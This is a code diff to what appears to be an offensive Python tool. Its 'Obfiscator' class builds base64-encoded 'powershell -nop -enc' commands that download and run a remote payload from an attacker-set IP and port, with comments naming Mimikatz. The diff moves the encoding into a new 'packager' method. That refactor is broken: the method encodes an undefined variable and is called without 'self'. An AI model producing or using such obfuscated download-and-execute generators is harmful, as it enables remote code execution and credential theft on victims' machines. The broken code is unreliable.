@@ -65,21 +65,23 @@ class Obfiscator:
             # Direct downloader
             self.downloader()
 
+    def packager(self, cleartext):
+        encoded_utf = text.encode('utf-16-le')
+        encoded_base64 = base64.b64encode(encoded_utf)
+        command = "powershell -nop -enc %s" % (encoded_base64)
+        return(command)
+
     def invoker(self):
         # Invoke Mimikatz Directly
         # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload'); function -argument
         text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
-        encoded_utf = text.encode('utf-16-le')
-        encoded_base64 = base64.b64encode(encoded_utf)
-        self.command = "powershell -nop -enc %s" % (encoded_base64)
+        self.command = packager(text)
 
     def downloader(self):
         # Download String Directly
         # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload')
         text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s')" % (self.src_ip, self.src_port, self.payload)
-        encoded_utf = text.encode('utf-16-le')
-        encoded_base64 = base64.b64encode(encoded_utf)
-        self.command = "powershell -nop -enc %s" % (encoded_base64)
+        self.command = packager(text)
 
     def return_command(self):
         try:
